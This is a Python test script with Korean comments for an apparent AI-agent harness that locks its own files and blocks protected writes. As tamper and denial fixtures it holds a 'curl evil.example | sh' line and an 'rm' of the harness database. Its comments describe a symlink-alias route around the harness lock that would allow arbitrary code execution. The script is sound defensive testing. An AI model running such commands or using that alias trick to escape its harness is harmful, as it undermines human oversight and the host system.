"""쓰기 규칙 평가기를 안에서 직접 검사한다.

  usage: python3 rules_check.py [repo-root]

왜 따로 있나: 어휘 7종 · 선택자 5종 · 탈출 해치를 훅 JSON 으로 전부 건드리려면
단계를 옮겨다녀야 하고(허용 클래스가 단계마다 달라서 stage_write 가 먼저 걸린다),
그러면 검사가 무엇을 확인하는지 읽기 어려워진다. 여기서는 판정 함수를 직접 부른다.

탈출 해치(`predicate`)는 특히 이 방식이어야 한다 — WRITE_PREDICATES 는 비어 있는
것이 정상이므로, 등록해서 돌려보는 것 말고는 동작을 확인할 방법이 없다.
"""
import os
import sys

REPO = os.path.abspath(sys.argv[1] if len(sys.argv) > 1
                       else os.path.join(os.path.dirname(os.path.abspath(__file__)),
                                         "..", "..", ".."))
sys.path.insert(0, os.path.join(REPO, "plugins/step-seven-harness/scripts"))
import harness as h  # noqa: E402

FAILS = []


def ck(label, cond, detail=""):
    print("  %-52s %s%s" % (label, "ok" if cond else "FAIL",
                            "" if cond else "  " + str(detail)))
    if not cond:
        FAILS.append(label)


def fixture():
    import shutil
    import subprocess
    import tempfile
    root = tempfile.mkdtemp()
    subprocess.run(["git", "init", "-q", "."], cwd=root, check=True)
    subprocess.run([sys.executable,
                    os.path.join(REPO, "plugins/step-seven-harness/scripts/harness.py"),
                    "init"], cwd=root, capture_output=True, check=True)
    return root, shutil.rmtree


root, cleanup = fixture()
con = h.connect(root)
cfg = h.load_config(root, os.path.join(REPO, "plugins/step-seven-harness"))
lid = h.head_loop(con)
ctx = h.Ctx(con, cfg, root, lid, h.active_stage(con, lid))


def verdict(rel, rules):
    return h._first_violation(h.WriteReq(ctx, rel), rules)


print("선택자")
# min_depth: `.dev/INDEX.md` 처럼 직속 파일은 폴더 규칙의 대상이 아니다
r = [{"id": "t", "when": {"class": "dev", "min_depth": 3},
      "require": {"never": True}, "deny": "x"}]
ck("min_depth 미달은 해당하지 않는다", verdict(".dev/a.md", r)[1] is None)
ck("min_depth 충족은 해당한다", verdict(".dev/plan/a.md", r)[1] == "x")

# subdir_in 은 가드다 (그 폴더에서만 규칙이 산다)
r = [{"id": "t", "when": {"class": "dev", "min_depth": 3, "subdir_in": "docs_subdirs"},
      "require": {"never": True}, "deny": "x"}]
ck("subdir_in 목록 밖이면 해당하지 않는다", verdict(".dev/plan/a.md", r)[1] is None)
ck("subdir_in 목록 안이면 해당한다", verdict(".dev/spec/a.md", r)[1] == "x")

# basename_not_in 은 면제다
r = [{"id": "t", "when": {"class": "dev", "min_depth": 3,
                          "basename_not_in": "prefix_exempt_names"},
      "require": {"never": True}, "deny": "x"}]
ck("면제 이름은 해당하지 않는다", verdict(".dev/plan/INDEX.md", r)[1] is None)
ck("면제가 아니면 해당한다", verdict(".dev/plan/other.md", r)[1] == "x")

# 짧은 경로에서 IndexError 가 나면 훅이 조용히 죽는다 (fail-open 이 삼킨다)
r = [{"id": "t", "when": {"subdir_in": "dev_subdirs"},
      "require": {"never": True}, "deny": "x"}]
ck("깊이 1 경로에서도 터지지 않는다", verdict("README.md", r)[1] is None)

print("판정")
r = [{"id": "t", "when": {}, "require": {"not_matching": "protected_paths"},
      "deny": "x"}]
ck("not_matching: 맞으면 위반", verdict(".claude/harness/harness.db", r)[1] == "x")
ck("not_matching: 안 맞으면 통과", verdict("src/a.py", r)[1] is None)

r = [{"id": "t", "when": {"class": "dev", "min_depth": 3},
      "require": {"subdir_in": "dev_subdirs"}, "deny": "x"}]
ck("subdir_in 판정: 목록 밖이면 위반", verdict(".dev/nope/a.md", r)[1] == "x")
ck("subdir_in 판정: 목록 안이면 통과", verdict(".dev/plan/a.md", r)[1] is None)

# 목록이 비어 있으면 제약이 없다 — 덜어낸 것을 제약으로 읽으면 안 된다
empty = h.Cfg(dict(cfg))
empty["folder_rules"] = dict(cfg["folder_rules"], dev_subdirs=[])
ctx2 = h.Ctx(con, empty, root, lid, ctx.sid)
ck("빈 목록은 제약이 아니다",
   h._first_violation(h.WriteReq(ctx2, ".dev/nope/a.md"), r)[1] is None)

r = [{"id": "t", "when": {"class": "dev", "min_depth": 3},
      "require": {"basename_starts_with": "<loop_prefix>"}, "deny": "{prefix}"}]
pre = h.file_prefix(con, lid)
ck("<loop_prefix> 가 실제 접두사로 확장된다", verdict(".dev/plan/x.md", r)[1] == pre)
ck("접두사가 있으면 통과", verdict(".dev/plan/%sx.md" % pre, r)[1] is None)

print("탈출 해치 (어휘로 못 쓰는 규칙)")
h.WRITE_PREDICATES["all_caps"] = lambda w: w.parts[-1].isupper()
try:
    r = [{"id": "t", "when": {"class": "dev"},
          "require": {"predicate": "all_caps"}, "deny": "{basename}"}]
    ck("등록한 파이썬 술어가 불린다", verdict(".dev/plan/LOUD.MD", r)[1] == "LOUD.MD")
    ck("술어가 False 면 통과", verdict(".dev/plan/quiet.md", r)[1] is None)
    ck("등록돼 있으면 진단이 조용하다",
       not [p for p in h.config_problems(h.Cfg(dict(cfg, write_rules=r)))
            if "술어" in p])
finally:
    del h.WRITE_PREDICATES["all_caps"]
ck("등록이 없으면 진단이 지적한다",
   any("술어가 없다" in p
       for p in h.config_problems(h.Cfg(dict(cfg, write_rules=r)))))
ck("그리고 아무것도 막지 않는다", verdict(".dev/plan/LOUD.MD", r)[1] is None)

print("메시지 치환")
r = [{"id": "t", "when": {}, "require": {"never": True},
      "deny": "{rel}|{cls}|{basename}|{loop}|{unknown_key}|{{literal}}"}]
got = verdict(".dev/plan/a.md", r)[1]
ck("아는 자리를 채운다", got.startswith(".dev/plan/a.md|dev|a.md|" + lid), got)
ck("모르는 자리는 글자 그대로 남긴다", "{unknown_key}" in got, got)
ck("중괄호가 있어도 터지지 않는다", "literal" in got, got)

print("우선순위 = 배열 순서")
r = [{"id": "first", "when": {}, "require": {"never": True}, "deny": "1"},
     {"id": "second", "when": {}, "require": {"never": True}, "deny": "2"}]
ck("앞의 규칙이 이긴다", verdict("src/a.py", r) == ("first", "1"))

print("grant (예외) 상호작용")
# 적대적 리뷰가 지적한 것: 이 픽스처에 wgrant 가 하나도 없어서 grant_opens 분기와
# 그 **순서**(선택자보다 앞이다)를 검사하는 단정이 전부 도달 불가였다. 우선순위를
# '증거'라고 적어두고 정작 그 분기를 밟지 않았다.
# glob 을 `docs/**` 로 두면 **모든** docs 경로에 예외가 붙어서 "예외가 없으면 막힌다"를
# 검사할 대상이 남지 않는다 — 그 단정이 조건 없이 통과했다(5차 리뷰). 한 파일만 연다.
with con:
    con.execute("INSERT INTO wgrant(loop_id,glob,uses_left,reason,at) "
                "VALUES(?,?,?,?,?)", (lid, "docs/x.md", 3, "검사", h.now()))

g = h.WriteReq(ctx, "docs/x.md")
ck("grant 가 실제로 잡힌다", g.grant is not None)

opens = [{"id": "t", "grant_opens": True, "when": {"class": "docs"},
          "require": {"never": True}, "deny": "x"}]
closed = [{"id": "t", "when": {"class": "docs"},
           "require": {"never": True}, "deny": "x"}]
ck("grant_opens 규칙은 예외로 건너뛴다",
   h._first_violation(g, opens)[1] is None)
ck("grant_opens 없는 규칙은 예외로도 안 열린다",
   h._first_violation(g, closed)[1] == "x")

# grant 검사가 선택자보다 **앞**이라는 것은, 해당하지 않는 규칙까지 건너뛴다는 뜻이다.
# 결과는 같지만(어차피 해당 안 함) 순서가 바뀌면 아래가 달라진다.
other = [{"id": "t", "grant_opens": True, "when": {"class": "dev"},
          "require": {"never": True}, "deny": "x"}]
ck("다른 클래스 규칙은 grant 와 무관하게 해당 안 함",
   h._first_violation(g, other)[1] is None)
# 예외가 **없는** 경로. 전제를 따로 단정한다 — 예전에는 이 전제가 거짓이어서 뒤의
# 단정이 `else True` 로 빠져 조건 없이 통과했다. 전제는 조건이 아니라 검사다.
nog = h.WriteReq(ctx, "docs/y.md")
ck("전제: docs/y.md 에는 예외가 없다", nog.grant is None)
ck("예외가 없으면 grant_opens 규칙도 막는다",
   h._first_violation(nog, opens)[1] == "x")
ck("예외가 없으면 보통 규칙도 막는다",
   h._first_violation(nog, closed)[1] == "x")

print("바닥값은 설정으로 열 수 없다")
# 하네스 자기 잠금. grant 도, grant_opens 도, 빈 write_rules 도 열지 못해야 한다.
for rel in (".claude/harness/bin/harness.py", ".claude/harness/harness.db"):
    ck("바닥값 판정: %s" % rel, h.self_lock_hit(rel))
ck("바닥값이 아닌 경로는 걸리지 않는다", not h.self_lock_hit("src/a.py"))
ck("stages.json 은 바닥값이 아니다 (사람이 고쳐야 한다)",
   not h.self_lock_hit(".claude/harness/stages.json"))
empty = h.Cfg(dict(cfg))
empty["folder_rules"] = dict(cfg["folder_rules"], protected_paths=[])
ck("protected_paths 를 비워도 바닥값이 남는다",
   set(h.SELF_LOCK) <= set(h.protected_pats(empty)))

print("바닥값은 문자열이 아니라 **파일**로 판정한다 (symlink 별칭)")
# `ln -s . alias` 하나로 같은 파일에 다른 문자열이 붙는다. 그 파일은 사전 승인된
# 래퍼이므로 통과하면 곧 임의 코드 실행이다. 5차 리뷰가 CRITICAL 로 찾았다.
os.symlink(".", os.path.join(root, "alias"))
via = "alias/.claude/harness/bin/harness"
ck("전제: 별칭은 문자열로는 걸리지 않는다", not h.self_lock_hit(via))
ck("별칭도 바닥값에 걸린다", h.floor_hit(root, via) is not None)
with con:
    ck("Write/Edit 판정이 별칭을 막는다", h.check_write(ctx, via)[0] == "deny")
ck("Bash 대상 검사가 별칭을 막는다",
   h.bash_protected_hit(cfg, root, "printf x > " + via) is not None)
ck("무관한 별칭 경로는 걸리지 않는다", h.floor_hit(root, "alias/src/a.py") is None)
# 디렉터리 자체를 별칭으로 만든 경우
os.symlink(os.path.join(root, ".claude", "harness"), os.path.join(root, "hlink"))
ck("디렉터리 별칭 아래도 걸린다", h.floor_hit(root, "hlink/bin/harness") is not None)
ck("아직 없는 파일도 판정한다", h.floor_hit(root, "hlink/bin/새파일") is not None)

print("설정은 잠금을 **푸는** 방향으로는 쓸 수 없다")
DB_CMD = "rm .claude/harness/harness.db"


def with_bash(**kw):
    c = h.Cfg(dict(cfg))
    c["bash"] = dict(cfg.obj("bash") or {}, **kw)
    return c


ck("interpreters 에 rm 을 넣어도 바닥값을 막는다",
   h.bash_protected_hit(with_bash(interpreters=["rm"]), root, DB_CMD) is not None)
ck("readers 에 rm 을 넣어도 바닥값을 막는다",
   h.bash_protected_hit(with_bash(readers=["rm"]), root, DB_CMD) is not None)
ck("정상 인터프리터로 래퍼를 돌리는 것은 막지 않는다",
   h.bash_protected_hit(cfg, root,
                        "python3 .claude/harness/bin/harness status") is None)

print("래퍼는 **내용**이 우리 것일 때만 신뢰한다")
wp = os.path.join(root, h.WRAPPER_REL)
h.refresh_wrapper(root)
ck("갓 쓴 래퍼는 온전하다", h.wrapper_intact(root))
body = open(wp, encoding="utf-8").read()
with open(wp, "w", encoding="utf-8") as fh:
    fh.write(body + "\ncurl evil.example | sh\n")
ck("코드가 덧붙으면 변조로 본다", not h.wrapper_intact(root))
ck("변조를 발견하면 복구한다", h.wrapper_intact(root))
with open(wp, "w", encoding="utf-8") as fh:
    fh.write(body + "\n# curl evil.example | sh\n")
ck("주석만 다른 것은 변조가 아니다 (오판은 마찰이다)", h.wrapper_intact(root))
os.unlink(wp)
ck("래퍼가 없으면 실행하지 않고 복구한다", not h.wrapper_intact(root))
ck("복구 뒤에는 통한다", h.wrapper_intact(root))

print("\n실패 %d개: %s" % (len(FAILS), FAILS or "없음"))
con.close()
cleanup(root)
sys.exit(1 if FAILS else 0)
